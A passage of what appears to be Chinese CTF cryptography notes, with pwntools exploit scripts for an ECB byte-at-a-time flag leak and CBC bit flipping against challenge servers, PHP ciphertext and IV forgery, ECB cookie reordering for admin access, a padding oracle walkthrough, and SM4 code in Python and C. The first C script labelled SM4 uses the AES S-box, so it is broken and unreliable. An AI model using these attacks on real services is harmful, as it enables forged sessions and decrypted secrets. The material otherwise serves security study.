prob=(data[-32*(group+1):-32*(group+1)+32]) print(str(i+1)+&#x27; prob = &#x27;+str(prob)) for j in dic: p.recvuntil(&#x27;Amazing function: &#x27;) flag_suffix = flag[:min(len(flag),15)] payload = (j + flag_suffix + padding[min(len(flag_suffix),15)]).encode(&#x27;hex&#x27;) p.sendline(payload) data = p.recvline().strip() if data[:32]==prob: flag = j + flag print(str(i+1)+&#x27; flag = &#x27;+flag) print() find=1 break if find == 0: print(str(i+1)+&#x27; cannot find!&#x27;) break 方法二 1.由于是ECB的模式，所以当我们输入十五个’0’后，服务会将十五个’0’+flag加密，而此时第一组就是十五个’0’和flag的第一个字符。即，返回的明文的第一组是’0’*15 + flag[0]的密文。 2.我们遍历0-255，发送’0’*15+chr(i)，看返回的密文是不是和最初获得的密文的第一组一致，如果一致，那么此时的chr(i)就是flag的第一位。 3.有了第一位我们就可以发送’0’*14+flag[0]过去，此时返回的第一组密文就是’0’*14+flag[0]+flag[1]的密文了，我们继续用第2步的方法就可以恢复flag[1]了。 4.如此循环往复，逐位爆破flag。 12345678910111213141516171819202122def exp(): sh = remote(&quot;0.0.0.0&quot;,&quot;9999&quot;) pre=&quot;0&quot;*47 flag=&quot;&quot; for block in range(41): #发送填充，泄露一位flag，并获取密文 sh.recvuntil(&quot;Amazing function: &quot;) sh.sendline(pre.encode(&#x27;hex&#x27;)) target = sh.recvuntil(&quot;\\n&quot;)[:-1][64:96] for i in range(256): #遍历字符，找到与获取密文一致时的情况时，即得到一位明文 tmp = &#x27;0&#x27;*(47-block)+flag+chr(i) sh.recvuntil(&quot;Amazing function: &quot;) sh.sendline(tmp.encode(&#x27;hex&#x27;)) now = sh.recvuntil(&quot;\\n&quot;)[:-1] if now[64:96] == target: flag += chr(i) #修改填充 pre = pre[:-1] break return flag[7:-2] 重排攻击在块加密中ECB模式中每个块都是独立加密的。因此攻击者可以在未知密钥的情况下，对密文中的块进行重新排列，组合成合法的可解密的新密文。 考虑这么一种场景，某CMS的cookie格式为DES-ECB加密后的数据，而明文格式如下： 1admin=0;username=pan 由于DES使用的块大小是8字节，因此上述明文可以切分成三个块，其中@为填充符号： 123admin=0;username=pan@@@@ 假设我们可以控制自己的用户名（在注册时），那么有什么办法可以在不知道密钥的情况下将自己提取为管理员呢（即admin=1）？首先将用户名设置为pan@@@@admin=1;，此时明文块的内容如下： 1234admin=0;username=pan@@@@admin=1; 我们所需要做的，就是在加密完成后，将服务器返回的cookie使用最后一个块替换第一个块，这样一来就获得了一个具有管理员权限的合法cookie了。 ​ CBC模式IBM发明了密码分组链接（CBC，Cipher-block chaining）模式。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。 加密： Ciphertext-0 = Encrypt(Plaintext XOR IV) ——只用于第一个组块Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1) ——用于第二及剩下的组块 $\\left\\{\\begin{array} {c} c_1 = \\text{Enc}(m_1 \\oplus \\text{iv}) \\newline c_2 = \\text{Enc}(m_2 \\oplus c_1) \\newline \\vdots \\newline c_i = \\text{Enc}(m_i \\oplus c_{i-1}) \\end{array} \\right.$ 解密： Plaintext-0 = Decrypt(Ciphertext) XOR IV ——只用于第一个组块Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1 ——用于第二及剩下的组块 $\\left\\{\\begin{array} {c} m_1 = \\text{Dec}(c_1)\\oplus \\text{iv} \\newline m_2 = \\text{Dec}(c_2)\\oplus c_1 \\newline \\vdots \\newline m_i = \\text{Dec}(c_i)\\oplus c_{i-1} \\end{array} \\right.$ CBC字节翻转Plaintext：明文数据 IV：初始向量 Key：分组加密使用的密钥 Ciphertext：密文数据 每组解密时，先进行分组加密算法的解密，然后与前一组的密文进行异或才是最初的明文。 对于第一组则是与IV进行异或。 上一块密文用来产生下一块明文，如果改变上一块密文的一个字节，然后与下一个解密后的组块异或，就可以得到一个不同的明文。 目标：要把Plain2中的某一字节翻转为另一字节。 由于C1来自于Cipher2进行Block Cipher Decryption之后的结果，而且Key未知，就不能直接得知C1的值； 但可通过字节翻转修改上一组密文Cipher1来翻转下一组的明文Plain2，从而可以完全忽视未知的C1值。 由异或运算可以推导：B1 = A1 ^ C1，则也有：C1 = A1 ^ B1 假设修改后的上一组密文为A1&#39;，要翻转的下一组明文为B1&#39;，则有：B1&#39; = A1&#39; ^ C1 如果能够修改Cipher1，那么就能够修改A1的值为A1&#39;，即A1&#39; = A1 ^ B1 ^ B1&#39;。 即： 12345678B = A ^ CB&#x27; = A&#x27; ^ CA&#x27; = A ^ B ^ B&#x27;A=原上一组密文Cipher1B=原下一组明文Plain2B‘=要翻转的下一组明文Plain2&#x27;A&#x27;=要修改的上一组密文Cipher1&#x27; 要求：1. 对于A1完全可控；2. 已知B1的值。 由于修改了A1，Cipher1在进行Block Cipher Decryption的时候会得出错误的结果，再与IV异或会导致Plain1出错； 如果能够得到修改A1之后产生的错误的Plain1的值，而且IV可以完全控制的话，那么就能够再套用一次前面的方法。 即： 12345678B = A ^ CB&#x27; = A&#x27; ^ CA&#x27; = A ^ B ^ B&#x27;A=原IV值ivB=错误的明文Plain1B‘=要翻转的明文Plain1&#x27;A&#x27;=要修改的IV值iv&#x27; 参考：SYPUCTF2020 - Yusa的密码学课堂—CBC第一课 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *import binasciiimport timep = remote(&#x27;das.wetolink.com&#x27;,42888) # 连接p.recvline()p.recvline()p.recvline()p.recvline()p.sendline(&#x27;1&#x27;) # 注册p.recv()p.sendline(&#x27;Admin&#x27;) # 用户名为Admin，方便之后修改data0 = p.recvline().decode()data0 = data0[28:124] # 提取返回数据部分iv0 = data0[:32] #返回的IVcipher00 = data0[32:64] #&#x27;yusayusayusayusa&#x27;的加密结果cipher01 = data0[64:96] #&#x27;Admin&#x27;的加密结果replacement0 = str(hex(int(cipher00[:2],16)^ord(&#x27;A&#x27;)^ord(&#x27;a&#x27;)))[2:] # 计算替换密文的值payload0 = iv0+replacement0+cipher00[2:]+cipher01 # 发送替换密文print(&#x27;data0: &#x27;,data0)print(&#x27;payload0: &#x27;,payload0)p.recvline()p.recvline()p.recvline()p.recvline()p.sendline(&#x27;2&#x27;) # 登入p.recv()p.sendline(payload0) # 发送Payload0data1 = p.recvline()[:64+len(&#x27;Admin&#x27;)*2] # 得到返回的数据data1 = data1.decode()plain1 = data1[32:64] # &#x27;yusayusayusayusa&#x27;由于密文被替换，解出来的明文是错误的，之后可以进行异或修改print(&#x27;data1: &#x27;,data1)print(&#x27;plain1: &#x27;,plain1)iv1 = str(hex(int(binascii.hexlify(&#x27;yusa&#x27;.encode()).decode()*4,16)^int(plain1,16)^int(iv0,16)))[2:] # 计算IV，用于修改错误的明文print(&#x27;iv1: &#x27;,iv1)payload1 = iv1+replacement0+cipher00[2:]+cipher01print(&#x27;payload1: &#x27;,payload1)p.recvline()p.recvline()p.recvline()p.recvline()p.sendline(&#x27;2&#x27;) # 登入p.recv()p.sendline(payload1) # 发送Payload1p.recvline()p.recvline()print(p.recvline()) # 得到flag CBC字节翻转（Web）参考：bugkuctf–login4字节翻转攻击 123456789101112131415161718//原密文修改字符&lt;?php$enc=base64_decode(&quot;bIpgPK29vVQosJ+smzh0pOdq7QrP3H9CN0MBfynL1eKtILs/ayew1snTYbeYSIz8rQctkAUMORS76SWQHXwuKg==&quot;);$enc[13] = chr(ord($enc[13]) ^ ord(&quot;k&quot;) ^ ord (&quot;n&quot;));echo base64_encode($enc);?&gt; //新密文，修改对应iv值保证首块解密无错&lt;?php$enc=base64_decode(&quot;4quudO++PAeVPQfcFJ0bbm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&quot;); $iv=base64_decode(&quot;TrphJjWLH37sj6+EBqh28A==&quot;);$cleartext = &#x27;a:2:&#123;s:8:&quot;userna&#x27;;$newiv = &#x27;&#x27;;for ($i=0;$i&lt;16;$i++)&#123; $newiv=$newiv.chr(ord($iv[$i]) ^ ord($enc[$i]) ^ ord ($cleartext[$i]));&#125;echo base64_encode($newiv);?&gt; Padding Oracle AttackPadding Oracle Attack漏洞主要是由于设计使用的场景不当，导致可以利用密码算法通过”旁路攻击“被破解，利用该漏洞可以破解出密文的明文以及将明文加密成密文，该漏洞存在条件如下： 攻击者能够获取到密文（基于分组密码模式），以及IV向量（通常附带在密文前面，初始化向量） 攻击者能够修改密文触发解密过程，解密成功和解密失败存在差异性 根源这个攻击的根源是明文分组和填充，同时应用程序对于填充异常的响应可以作为反馈，例如请求 http://www.example.com/decrypt.jsp?data=0000000000000000EFC2807233F9D7C097116BB33E813C5E，当攻击者在篡改data值时会有以下不同的响应： 如果data值没有被篡改，则解密成功，并且业务校验成功，响应200 如果data值被篡改，服务端无法完成解密，解密校验失败，则响应500 如果data值被篡改，但是服务端解密成功，但业务逻辑校验失败，则可能返回200或302等响应码，而不是响应500 攻击者只需要关注解密成功和解密失败的响应即可（第三种属于解密成功的响应），即可完成攻击。 破解明文解密最后一个数据块，其结尾应该包含正确的填充序列。如果这点没有满足，那么加/解密程序就会抛出一个填充异常。Padding Oracle Attack的关键就是利用程序是否抛出异常来判断padding是否正确。 在不知道明文的情况下，如何猜解出明文？首先将密文分组，前面8个字节为初始化向量，后面16个字节为加密后的数据： 123初始化向量：7B 21 6A 63 49 51 17 0F第一组密文：F8 51 D6 CC 68 FC 95 37第二组密文：85 87 95 A2 8E D4 AA C6 看如何通过构造前面初始向量来破解第一组密文：http://www.example.com/decrypt.jsp?data=7B216A634951170FF851D6CC68FC9537 将初始化向量全部设置为0，提交如下请求http://www.example.com/decrypt.jsp?data=00000000000000000F851D6CC68FC9537 ，服务器势必会解密失败，返回HTTP 500，是因为在对数据进行解密的时候，明文最后一个字节的填充是0x3D，不满足填充规则，校验失败，此时示意图： 依次将初始化向量最后一个字节从0x01~0xFF递增，直到解密的明文最后一个字节为0x01，成为一个正确的padding，当初始化向量为000000000000003C时，成功，服务器返回HTTP 200，解密示意图： 已知构造成功的IV最后一个字节为0x3C，最后一个填充字符为0x01，则能通过XOR计算出，第一组密文解密后的中间值最后一个字节：0x01 xor 0x3C = 0x3D；重点：第一组密文解密的中间值是一直不变的，同样也是正确的，通过构造IV值，使得最后一位填充值满足0x01，符合padding规则，则意味着程序解密成功（当前解密的结果肯定不是原来的明文），通过循环测试的方法，猜解出中间值的最后一位，再利用同样的方式猜解前面的中间值，直到获取到完整的中间值。 下面将构造填充值为0x02 0x02的场景，即存在2个填充字节，填充值为0x02，此时已经知道了中间值得最后一位为0x3D，计算出初始向量的最后一位为 0x3D xor 0x02 = 0x3F，即初始向量为0000000000000003F，遍历倒数第二个字节从0x00~0xFF，直到响应成功，猜解出中间值得后两个字节分别为 0x26 0x3D，示意图： 通过同样的方式，完成第一组密文中间值的猜解。 当第一组密文的中间值猜解成功后，将中间值和已知的IV做异或，则得到第一组密文的明文： 123450x39 0x73 0x23 0x22 0x07 0x6A 0x26 0x3D xor 0x7B 0x21 0x6A 0x63 0x49 0x51 0x17 0x0F= BRIAN;12 续破解第二组密文，第二组密文的IV向量是第一组密文，按照上述的逻辑构造第一组密文，即可破解出第二组明文。 伪造密文已经知道了中间值，那么只需传递指定的IV，就能制造任意想要的密文，如加密TEST： BP插件：PaddingOracleHunter ​ SM4SM4是一种分组密码算法，其分组长度为128位（即16字节，4字），密钥长度也为128位（即16字节，4字）。其加解密过程采用了32轮迭代机制（与DES、AES类似），每一轮需要一个轮密钥（与DES、AES类似）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# Pythonclass SM4Cipher: def __init__(self, key: bytes): if not len(key) == 16: raise ValueError(&quot;SM4 key must be length of 16. &quot;) self._key_r = self._generate_key(key) self.block_size = 16 def encrypt(self, plaintext: bytes): return self._do(plaintext, self._key_r) def decrypt(self, ciphertext: bytes): return self._do(ciphertext, self._key_r[::-1]) def _do(self, text: bytes, key_r: list): text_ = [0 for _ in range(4)] # 将 128bit 转化成 4x32bit for i in range(4): text_[i] = int.from_bytes(text[4 * i:4 * i + 4], &#x27;big&#x27;) for i in range(32): box_in = text_[1] ^ text_[2] ^ text_[3] ^ key_r[i] box_out = self._s_box(box_in) temp = text_[0] ^ box_out ^ self._rot_left(box_out, 2) ^ self._rot_left(box_out, 10) temp = temp ^ self._rot_left(box_out, 18) ^ self._rot_left(box_out, 24) text_ = text_[1:] + [temp] text_ = text_[::-1] # 结果逆序 # 将 4x32bit 合并成 128bit result = bytearray() for i in range(4): result.extend(text_[i].to_bytes(4, &#x27;big&#x27;)) return bytes(result) def _generate_key(self, key: bytes): &quot;&quot;&quot;密钥生成&quot;&quot;&quot; key_r, key_temp = [0 for _ in range(32)], [0 for _ in range(4)] FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc] CK = [0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279] # 将 128bit 拆分成 4x32bit for i in range(4): temp = int.from_bytes(key[4 * i:4 * i + 4], &#x27;big&#x27;) key_temp[i] = temp ^ FK[i] # 循环生成轮密钥 for i in range(32): box_in = key_temp[1] ^ key_temp[2] ^ key_temp[3] ^ CK[i] box_out = self._s_box(box_in) key_r[i] = key_temp[0] ^ box_out ^ self._rot_left(box_out, 13) ^ self._rot_left(box_out, 23) key_temp = key_temp[1:] + [key_r[i]] return key_r @staticmethod def _s_box(n: int): BOX = [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84, 0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48] result = bytearray() # 将 32bit 拆分成 4x8bit，依次进行S盒变换 for item in list(n.to_bytes(4, &#x27;big&#x27;)): result.append(BOX[item]) return int.from_bytes(result, &#x27;big&#x27;) @staticmethod def _rot_left(n, m): &quot;&quot;&quot;循环左移&quot;&quot;&quot; return ((n &lt;&lt; m) | (n &gt;&gt; (32 - m))) &amp; 0xFFFFFFFF key = bytes.fromhex(&quot;0123456789ABCDEFFEDCBA9876543210&quot;) # 128bit密钥plaintext = bytes.fromhex(&quot;00112233445566778899aabbccddeeff&quot;) # 128bit明文sm4 = SM4Cipher(key)print(sm4.encrypt(plaintext).hex()) # 09325c4853832dcb9337a5984f671b9a 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164// C 脚本1#include &lt;stdio.h&gt;#include &lt;iostream&gt;#include&lt;bits/stdc++.h&gt;#include &lt;string.h&gt;/************************************固定参数****************************************/ //S盒const unsigned char Sbox[256] = &#123; 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16&#125;;//CK为固定参数，用于密钥扩展算法 const unsigned int CK[32] = &#123; 0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279 &#125;;//系统参数FK，密钥扩展算法中会使用到 const unsigned int FK[4]=&#123;0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC&#125;; /************************************全局变量****************************************/ unsigned int rk[32];//子密钥 unsigned int X[32];//每一轮加密的结果 unsigned int X_0[32];//每一轮解密的结果 unsigned int y[4];//暂时存放32轮后的密文 unsigned int y2[4];//暂时存放32轮后的明文 /***********************************测试用例*****************************************/ unsigned int key[4]=&#123;0x01234567,0x89abcdef,0xfedcba98,0x76543210&#125;;// //unsigned int message[4]=&#123;0x01234567,0x89abcdef,0xfedcba98,0x76543210&#125;;//unsigned int message[16]=&#123;0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01&#125;;/* *利用S盒非线性置换 *传进来的A（32位）取高位的8位（大端机真实的低位在高位储存）与0xFF做与运算，*经过Sbox置换后放置低位的8位中，再与其他置换出的数做或运算得到t *截断用 &gt;&gt;（位数） &amp; 0xff，而拼接用 | */ unsigned int T(unsigned int A)&#123; unsigned int t; t = Sbox[(A)&gt;&gt;24&amp;0xFF]&lt;&lt;24|Sbox[(A)&gt;&gt;16&amp;0xFF]&lt;&lt;16|Sbox[(A)&gt;&gt;8&amp;0xFF]&lt;&lt;8|Sbox[(A)&amp;0xFF]; return t;&#125; /**循环右移*x为数，y为右移的位数 */ unsigned int Rotl(unsigned int x, unsigned int y)&#123; unsigned int t = ((x)&gt;&gt;(y)|(x)&lt;&lt;(32-(y))); return t;&#125;/**线性转换L1*在轮函数中用到 */ unsigned int L1(unsigned int t)&#123; t = (t)^Rotl(t,2)^Rotl(t,10)^Rotl(t,18)^Rotl(t,24); return t;&#125; /**线性转换L2*在子密钥扩展中用到 */ unsigned int L2(unsigned int t)&#123; t = (t)^Rotl(t,12)^Rotl(t,22); return t;&#125; /**sms4加密算法 */void encrypt(unsigned int x[], unsigned int rk[32], int num)&#123; for(int i=0; i&lt;32; i+=4)&#123; x[0+num] = x[0+num]^L1(T(x[1+num]^x[2+num]^x[3+num]^rk[i+0])); x[1+num] = x[1+num]^L1(T(x[2+num]^x[3+num]^x[0+num]^rk[i+1])); x[2+num] = x[2+num]^L1(T(x[3+num]^x[0+num]^x[1+num]^rk[i+2])); x[3+num] = x[3+num]^L1(T(x[0+num]^x[1+num]^x[2+num]^rk[i+3])); X[i+0] = x[0+num]; X[i+1] = x[1+num]; X[i+2] = x[2+num]; X[i+3] = x[3+num]; &#125; y[0] = X[31]; y[1] = X[30]; y[2] = X[29]; y[3] = X[28];&#125;/**sms4解密算法 */void decrypt(unsigned int x[], unsigned int rk[32], int num)&#123; for(int i=0; i&lt;32; i+=4)&#123; x[0] = x[0]^L1(T(x[1]^x[2]^x[3]^rk[31-i])); x[1] = x[1]^L1(T(x[2]^x[3]^x[0]^rk[30-i])); x[2] = x[2]^L1(T(x[3]^x[0]^x[1]^rk[29-i])); x[3] = x[3]^L1(T(x[0]^x[1]^x[2]^rk[28-i])); X_0[i+0] = x[0]; X_0[i+1] = x[1]; X_0[i+2] = x[2]; X_0[i+3] = x[3]; &#125; y2[0] = X_0[31]; y2[1] = X_0[30]; y2[2] = X_0[29]; y2[3] = X_0[28];&#125;/**密钥扩展算法*/ void keyExt(unsigned int key[4])&#123; unsigned int K[4]; K[0] = key[0]^FK[0]; K[1] = key[1]^FK[1]; K[2] = key[2]^FK[2]; K[3] = key[3]^FK[3]; for(int i=0; i&lt;32; i+=4)&#123; K[0] = K[0]^L2(T(K[1]^K[2]^K[3]^CK[i+0])); K[1] = K[1]^L2(T(K[2]^K[3]^K[0]^CK[i+1])); K[2] = K[2]^L2(T(K[3]^K[0]^K[1]^CK[i+2])); K[3] = K[3]^L2(T(K[0]^K[1]^K[2]^CK[i+3])); rk[i+0] = K[0]; rk[i+1] = K[1]; rk[i+2] = K[2]; rk[i+3] = K[3]; &#125;&#125;int main()&#123; unsigned int cipher[4]; unsigned int *message_0; //生成子密钥 keyExt(key); //开始解密 FILE *p = fopen(&quot;./cipher.txt&quot;, &quot;r+&quot;); FILE *p2 = fopen(&quot;./decrypted_message.txt&quot;, &quot;wb&quot;); printf(&quot;\\n明文为：\\n&quot;); for(int j=0;j&lt;494868;j+=4)&#123; for(int i=0;i&lt;4;i++) fscanf(p,&quot;%08x&quot;, &amp;cipher[i]); decrypt(cipher,rk,j); message_0 = y2; for(int i=0;i&lt;4;i++)&#123; printf(&quot;%08x &quot;, message_0[i]); fprintf(p2,&quot;%08x &quot;, message_0[i]); &#125; printf(&quot;\\n&quot;); fprintf(p2,&quot;\\n&quot;); &#125; fclose(p); fclose(p2);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269// C 脚本2#ifndef _SM4_H_#define _SM4_H_#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define u8 unsigned char#define u32 unsigned longvoid four_uCh2uLong(u8* in, u32* out); //四字节转换成u32void uLong2four_uCh(u32 in, u8* out); //u32转换成四字节unsigned long move(u32 data, int length); //左移，保留丢弃位放置尾部unsigned long func_key(u32 input); //先使用Sbox进行非线性变化，再将线性变换L置换为L&#x27;unsigned long func_data(u32 input); //先使用Sbox进行非线性变化，再进行线性变换Lvoid print_hex(u8* data, int len); //无符号字符数组转16进制打印void encode_fun(u8 len, u8* key, u8* input, u8* output); //加密函数void decode_fun(u8 len, u8* key, u8* input, u8* output); //解密函数/******************************定义系统参数FK的取值****************************************/const u32 TBL_SYS_PARAMS[4] = &#123; 0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc&#125;;/******************************定义固定参数CK的取值****************************************/const u32 TBL_FIX_PARAMS[32] = &#123; 0x00070e15,0x1c232a31,0x383f464d,0x545b6269, 0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9, 0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249, 0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9, 0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229, 0x30373e45,0x4c535a61,0x686f767d,0x848b9299, 0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209, 0x10171e25,0x2c333a41,0x484f565d,0x646b7279&#125;;/******************************SBox参数列表****************************************/const u8 TBL_SBOX[256] = &#123; 0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05, 0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99, 0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62, 0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6, 0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8, 0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35, 0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87, 0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e, 0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1, 